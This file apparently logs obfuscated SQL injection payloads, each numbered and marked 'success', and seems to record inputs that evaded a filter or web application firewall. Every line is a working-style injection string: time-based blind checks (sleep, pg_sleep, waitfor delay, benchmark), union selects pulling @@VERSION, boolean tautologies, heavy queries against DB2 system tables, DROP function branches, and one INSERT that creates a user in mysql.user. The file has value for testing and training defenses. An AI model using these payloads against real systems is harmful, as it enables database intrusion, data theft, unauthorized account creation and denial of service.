19 success "0x1'+  (  select\ndpkp where 4836  =  4836 AND True AND True and sleep  (  5   )    )   +' "
24 success '-2378" where 2686  =  0xa7e OR \'BC\' NOT LIKE \'BC\'\x0cor 0x1ad8  =  0x1ad8 AND 1-- 6J'
29 success 'eND And\t   (    (   7786 LIKE 7786 '
34 success '-4543"  )   Or \'/\' NOT LIKE \'/O\' '
36 success '1"\x0cwhere \'S;jy\' LIKE \'S;jy\'\x0bAND 1\x0c'
42 success "(SELECT 1)'||  (  select 'svnn' from dual where 0x2206  =  8710/**/"
58 success '1   )    )    as\nxzcl/**/where/**/2332  =  0x91c '
64 success '1%" and/**/elt  (  5345  =  0x222f,8751  )   and "%"  = \x0c" '
65 success "-8397'   )    )     )   OR 2171  = \x0c0x12b4 "
85 success ' sELECT * frOm users wHERe id   lIke   1\toR 1#"1 union sElECT \'a\',version  (    )   -- 1 '
97 success "-9356 Or elt  (  'P=,' LIKe 'P=,',0xe27  )  -- izgi "
102 success "0x1' whERE 0x109d   LIKE \xa0/**/4253\x0c"
103 success '0x1" wHeRE/**/3510   lIkE  /**/3510 '
118 success "selECt count  (  *  )   FrOM sysibm.systables AS t1,sysibm.systables aS t2,sysibm.systables As t3 AND    (    (     (  'vcgc' LikE 'vcgc "
122 success "1'  )   where 3322=3322 "
124 success '1" AND elt  (  0x1099 \n liKe  /**/4249,0x1c5b  )   '
139 success '1"  )   AS rcnk/**/wHErE \'?C\' lIKE \'?C\'\t'
141 success '1%" \x0c)   aNd/**/8024\x0b\x0c lIke   0xde8-- '
178 success "-3867%'  )   or 0xc0c  =  5633 and   (  '%'  =  ' "
181 success '1  )   oR\x0belt  (  5245=5245,sleep  (  5   )    )    anD   ( \x0c8600  =  8600 '
202 success '-5591%"   )    )    order/**/by 1-- ^'
204 success "-8410'\xa0  )    )     )   or 'X' NOT LIKE 'X4' OR False-- `E"
208 success "0x1' IN boolean/**/mode  )   && sleep  (  (sElECt 5)  )  # "
212 success "1'+  (  SeLECt yjyp WhERE\x0c'['='[' "
241 success "1'||  (  select 'vdeo' where 'i'\nNOT LIKE 'i_' "
246 success "select sleep  (  5  )   and    (    (   '?6o' LIKE '?6o' "
255 success ' seLEct * FrOm\tusers WhERE\x0bid \t Like   \'0x1\' union SElEct $["],@@VERSION -- 0x1\' '
258 success '0x1"  )   AS jqli whERE 7903 IN (7902,7903,7904) '
277 success "0x1'||  (  select 'zqwd' where '<D' NOT LIKE '<Dd' rlike sleep  (  5   )    )   ||' "
306 success '1"  )  \x0bwhere \'_R\'=\'_R\' '
319 success '-7416" WherE\x0c\'.n=j-\' NOT LIKE \'.n=j-)\' OrDer/**/By 1-- '
322 success 'iF  (  3392  =  4422  )   SeLeCt (sELEcT 3392) elSe DrOP function xsqq-- '
325 success "1',  (  select   (  case when   (  'pwbc'='pwbc'  )   then 0x1 else 0x1/  (  select 0  )   end   )    )    "
332 success "-9393' where 0xc2f  =  3119 or 0x217b   LIKE   8571-- "
353 success '0x1"   )    )    Or 0x1fdc  =    (  sElEct count  (\x0b *  )   FrOm generate_series  (  0x1,(SELECT 0x4c4b40)   )    )   -- '
356 success "-9509'   )    )     )   or 0x443  =  0x1565 and    (    (     (  'gsmz'  =  'gsmz "
358 success '0x1"  )   As zuzm whERE \'F3\' NOT LIKE \'F33\' ANd True ANd elt  (  0x1552 \n LIKE   0xb96,0xb96  )\n -- '
373 success '(SELECT 1)  )   Or elt  (  3160 NOT LIKE 3161,sleep  (  5   )\n   )   # _{'
381 success '1"  \x0b)    )    and (SELECT 0x1de8)  =  5604 and    (    (   "zuhv"  =  "zuhv '
386 success '1   )    )    as rvex where 3462  =  3462 AND 0x11f3  =  0x11f3# '
388 success '-0x118e or 5291  =  0x1164 '
391 success "1'||  ( /**/select 'lljg' FRoM dual wHeRE '<' LIKE '<' && True "
416 success "-9509'  )   where 9303  =  9303\x0bOR/*#*/False/**/order by 1# "
423 success 'iif \xa0(  0x20a2   LIKE   3515,1,1/0x0  )\t  '
426 success "INseRT into mysql.user   (  user, host, password  )   values/**/  (  'name', 'localhost', password  (  'pass123'   )    )    "
433 success '-0x990%"  )   Or \'u^\' NOT LIKE \'u^n\' AND True '
444 success "0x1'  )   && 0x1d6d   LIKE\t  0x1d6d "
448 success '0x1 whErE 0x8f4  =  (SeLeCt 0x8f4)\nunion all sEleCT null,null,null,null# '
459 success '-0x268f"  )   union\x0call SELECt 9082# '
463 success '0x1"   )    )    As nncz WHerE 4630=4630 '
470 success 'seLect caSE whEN 0x1f0f   lIkE   1147\ntHEN 1 ElSe null enD-- '
487 success "1%'  )   and elt  (  0x268\x0cIN (615,616,617),sleep  (  0x5   )    )   # "
493 success "0x1'||  ( \nselect\t'bzxa' whERe 0x193e=0x193e AND True "
494 success '1" WherE 4621 IN (4620,4621,4622) '
495 success "-3088' or 'dD' LIKE 'dD' and 'miwk'  =  'miwk "
516 success "waitfor delay '0x0:0:5' and '%'  =  '\n"
524 success '-8245"   )    )    oR \'wR$\' LIKE \'wR$\' '
541 success '0x1 \n)   where 0x8af  =  0x8af '
558 success "1'  )\n  order/**/by 0x1# "
561 success ' sElECT * frOM users whErE id   lIKE   1 or  @$#  =  1 union select 1,version  (  \n )   -- 1 '
563 success "-0xb04'   )    ) \x0b  OR 0x1a17\n =  0x2290-- _"
574 success "-4775'  )   or 3038/**/  LIKE   0xbde or False "
575 success 'If  (  4735  =  0x22cb  )   SeLecT 4735 ELse DrOp function qigo--\n'
577 success "1' where 0x65c   LIKE   1628/**/"
618 success "-4055'   )    )    As yoez whErE 3816  =  3816 OR \t (  'MN' NOT LIKE 'MNw'  )  *4906-- "
632 success '1"   )    )    as nbdc where 9787 LIKE 9787 OR 8650 NOT IN (8649,8650,8651) union all select null,null-- gu'
633 success "(SELECT 1)'||\t (  select 'boxx' where 2038  =  2038 and 9198  =  9198-- "
646 success 'If  (  0x205c  =  (SELECT 6171)  )   sElEct 0x205c eLse DRoP function\nmbih-- '
654 success '1" where 0x12a6 LIKE 0x12a6 AND \'W\' NOT LIKE \'Ww\'\t'
665 success '1  )   aS odqn Where 0xf46 \xa0 liKe   0xf46 '
672 success '-(SELECT 4091)"   )    )     )   union all sEleCT (SELECT 6694),6694-- '
693 success "waitfor/**/delay '0:0:5' aNd 'gsvt'\t = \x0b'gsvt "
703 success "0x1%'   )    )     )   union all seLecT null,null,null,null# "
712 success "(SeLEcT 1)'  )   as syer where 'd' LIKE 'd' rlike   (  SELEct   (  cASE WhEN   (  6233  =  7567  )   THeN 1 ELSE 0x28 EnD   )    ) \t -- "
726 success "1'/**/where '4O' NOT LIKE '4O_'\x0b"
738 success '(SELECT 28)%\t'
741 success "(SELECT 1) where '#_' LIKE '#_' OR '#}N' LIKE '#}NC' "
746 success 'SElEct CASe when (selECt\x0b0xe4d)\t  LiKE   (SelecT\x0b(SELECT 9315)) tHeN 0x1 ELse null EnD-- '
752 success " seLect * frOM users wHErE id   LiKe   '1'\x0boR \\<$ union SEleCT 1,@@VERSION -- 0x1' "
754 success "-2120'  )   or/**/8734  =  8844# "
768 success "1'   )    )    or elt  (  5011 LIKE 5011 AND True AND True,sleep  (  5   )\n   )    and    (    (   'cwjd'  =  'cwjd "
777 success '0x1  )   wheRE (sElect 0x1bb8) \n=  0x1bb8\x0c'
782 success "waitfor delay '0x0:0:0x5' anD   (  7749 NOT LIKE 7750 anD True "
785 success '1,  (  select   ( \x0ccase when   (  2916=2916  )   then 1 else 0x1/  (  select 0  )   end   )    )    '
808 success "0x1  )   AnD make_set  (  'D' NOT LIKE 'D1',(sElEcT 0x22c3)  )   "
847 success '1"   )    )     )   or 0x1cf9   LIKE     (  SeLeCt count  (  *  )   fRoM sysibm.systables AS t1,sysibm.systables aS t2,sysibm.systables AS t3  )  -- '
854 success "1'|| \t(  select 'kyhs' FROM dual wHERE 'KS\r' LIKE 'KS\r' OR 0x21f1 LIKE 8690 "
880 success "-9739'\tor (SELECT 0x217b)  =  8571-- "
911 success '  (  seLeCT count  (  *  )   FRom sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables As t3  )   '
932 success '1 WHErE 7871 LIKE 7871 '
942 success "select count  (  *  )   from generate_series  (  1,5000000  )   AND 'roca'  =  'roca "
944 success "-9358' OR/*D\t*/0x269f  =  0xa09-- "
949 success '-(sEleCT 6076)"   )    )    OR 0x2055  =  4757 '
980 success 'SeLect benchmark  (  0x4c4b40,md5  (  0x4c4d6142/**/  )    )   # idxq '
995 success "1'  )   where 'lk' NOT LIKE 'lk,' || False "
1000 success '1 where \'v\' not like \'v"\' AND/**/True\x0c'
1002 success "-3107'  )   wHEre 7782  =  7782 OR 5275=5275-- "
1017 success '-0x234d%" union all SelEcT 0x19b7#\x0b'
1018 success "-0x669' union all sELeCt 0x12e3# T"
1019 success "-(seLect 9429)'  )  /**/order by 0x1-- "
1022 success 'elt \t(  0xa07   LIKE   0x26c1,0x26c1  )   '
1047 success "1  )   wherE 444 NOT LIKE 445 aNd '\\' NOT LIKE '\\,' "
1050 success '-1203"   )    )    || \'I:1\' LIKE \'I:1\'-- '
1066 success "0x1' \xa0 )    )    union all SElECT null,null,null,null,null-- "
1068 success '1" where\x0b0x20c3  =  0x20c3 '
1070 success '-0xe7b"   )\x0b   )     )   or \'c\'m\'=\'c\'m\'-- '
1074 success "1'  )   as bzem where 3543 NOT LIKE 3544 OR False "
1078 success '1  )   where 7428=7428 '
1102 success '1" AnD elt  (  2319 LIKE 2319 Or False Or False,sleep  (  5   )    )    '
1104 success "-6218'   )   \x0c)    Or 0x8bc\x0b =  4469# "
1109 success '0x1"   )    )    Or 0x1090  =    (  SeLeCT 0x1090 froM pg_sleep  (  5   )    )   -- '
1117 success '-5963" OR 1261 lIKE 1261# '
1122 success "select count  (  *  )   from generate_series  (  1,(SELECT 5000000)  )   and    (    (   'hxcq'   LIKE   'hxcq "
1123 success "-1602'\x0cor 0xbde  =  3038/**/"
1139 success "1' wHeRE 2802/**/NOT LIKE 2803 union all seLecT null,null-- p]"
1143 success 'iif  (  1217  =  8831,1,(SELECT 1)/0  )   '
1144 success ' select * from users where id   LIKE   1 or "?  (  " or \'AkS\' NOT LIKE \'AkSH\' -- 1 '
